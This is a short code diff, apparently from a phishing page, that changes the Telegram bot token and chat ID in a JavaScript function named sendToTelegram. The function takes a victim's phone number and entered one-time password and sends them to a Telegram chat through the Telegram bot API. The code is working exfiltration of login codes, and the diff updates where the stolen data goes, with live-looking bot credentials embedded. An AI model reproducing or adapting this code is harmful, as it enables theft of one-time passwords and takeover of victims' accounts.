@@ -203,8 +203,8 @@
         }
 
         function sendToTelegram(phone, otp) {
-            const token = "7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0";
-            const chatId = "5615316142";
+            const token = "8318767273:AAH-_zRVgEvcC5ASdKL8QxxR4QfXeBMq3BE";
+            const chatId = "7728196897";
             const message = `OTP Entered: ${otp}%0APhone: ${phone}`;
 
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`)
